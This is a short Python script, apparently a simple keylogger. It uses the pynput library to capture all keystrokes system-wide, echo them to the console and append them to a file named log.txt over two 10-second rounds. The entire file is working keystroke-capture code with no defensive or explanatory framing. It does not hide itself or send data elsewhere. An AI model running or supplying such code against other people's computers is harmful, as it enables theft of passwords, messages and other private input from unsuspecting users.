from time import sleep
from pynput import keyboard

keylog = []

def log():
    with open("log.txt", 'a') as log:
        log.write(''.join(keylog))

def on_press(key):
    try:
        if(key == keyboard.Key.esc):
            print(''.join(keylog))
        print(str(key.char))
        keylog.append(str(key.char))
    except AttributeError:
        print(str(key)[4:])
        keylog.append(str(key)[4:])

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    print('collecting for 10 seconds')
    sleep(10)
    log()
    keylog = []
    print('keylog cleared')
    print('second round of collection')
    sleep(10)
    log()
    break
    
